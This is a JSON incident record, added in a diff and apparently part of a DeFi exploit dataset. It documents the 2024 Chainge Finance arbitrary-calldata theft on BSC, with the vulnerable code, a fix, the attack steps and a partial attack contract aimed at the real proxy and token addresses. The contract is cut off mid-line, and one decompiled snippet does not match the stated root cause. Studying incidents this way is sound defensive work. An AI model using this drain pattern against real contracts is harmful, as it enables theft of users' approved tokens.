@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-04-XX_ChaingeFinance_ArbitraryCalldata",
+ "source_file": "2024/2024-04-XX_ChaingeFinance_ArbitraryCalldata.md",
+ "title": "Chainge Finance — Arbitrary calldata in swap() Used to Steal Victim Tokens",
+ "date": "2024-04-01",
+ "protocol": "Chainge Finance",
+ "chain": "BSC",
+ "loss_raw": "~$200,000",
+ "loss_usd": 200000.0,
+ "root_cause": "`MinterProxyV2.swap()` executes arbitrary `callData` without validation, allowing unauthorized `transferFrom()` of tokens pre-approved by victims",
+ "attack_tx": null,
+ "vulnerable_contract": "MinterProxyV2 0x80a0d7a6",
+ "classes": [
+  "arbitrary-call"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: swap() executes arbitrary callData\ncontract MinterProxyV2 {\n    function swap(\n        address token,\n        uint256 amount,\n        bytes calldata callData  // ← no validation\n    ) external {\n        // callData is forwarded directly to the token contract\n        (bool success,) = token.call(callData);\n        require(success, \"swap failed\");\n    }\n}\n\n// Attacker's callData construction:\n// abi.encodeWithSelector(\n//   IERC20.transferFrom.selector,\n//   victim,      // from: victim\n//   attacker,    // to: attacker\n//   victimBalance // amount: full balance\n// )\n\n//",
+  "// File: ChaingeFinance_decompiled.sol\ncontract ChaingeFinance {\n    function transferOwnership(address p0) external {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: callData selector whitelist validation\nfunction swap(address token, uint256 amount, bytes calldata callData) external {\n    // Only allowed function selectors can be executed\n    bytes4 selector = bytes4(callData[:4]);\n    require(allowedSelectors[selector], \"selector not allowed\");\n    // Block transferFrom and transfer selectors\n    require(selector != IERC20.transferFrom.selector, \"transferFrom not allowed\");\n    (bool success,) = token.call(callData);\n    require(success);\n}"
+ ],
+ "steps": [
+  "→ [1] Collect list of victims (addresses that granted allowance to MinterProxyV2)",
+  "→ [2] For each token/victim combination:",
+  "→ [3] Call MinterProxyV2.swap(token, 0, transferFromCalldata)",
+  "token.call(callData) → executes IERC20.transferFrom()",
+  "Victim tokens → transferred to attacker",
+  "→ [4] Repeat collection across 12 tokens",
+  "→ [5] ~$200K drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Collect list of victims (addresses that granted allowance to MinterProxyV2)\n  │\n  ├─→ [2] For each token/victim combination:\n  │         ├─ Query victim.balanceOf()\n  │         └─ Query victim.allowance(victim, MinterProxyV2)\n  │\n  ├─→ [3] Call MinterProxyV2.swap(token, 0, transferFromCalldata)\n  │         └─ callData = abi.encode(transferFrom, victim, attacker, amount)\n  │         └─ token.call(callData) → executes IERC20.transferFrom()\n  │         └─ Victim tokens → transferred to attacker\n  │\n  ├─→ [4] Repeat collection across 12 tokens\n  │\n  └─→ [5] ~$200K drained",
+  "interface IMinterProxyV2 {\n    function swap(address token, uint256 amount, bytes calldata callData) external;\n}\n\ncontract AttackContract {\n    IMinterProxyV2 constant proxy = IMinterProxyV2(0x80a0d7a6fd2a22982ce282933b384568e5c852bf);\n\n    address[] tokens = [\n        0x55d398326f99059fF775485246999027B3197955, // USDT\n        // SOL, AVAX, BabyDoge, FOLKI, ATOM, TLOS, IOTX, LINCH, LINK, BTCB, ETH ...\n    ];\n\n    function testExploit(address[] calldata victims) external {\n        for (uint t = 0; t < tokens.length; t++) {\n            IERC20 token = IERC20(tokens[t]);\n            for (uint v = 0; v < victims.length; v++) {\n                address victim = victims[v];\n                uint256 allowed = token.allowance(victim, address(proxy));\n                uint256 bal     = token.balanceOf"
+ ]
+}
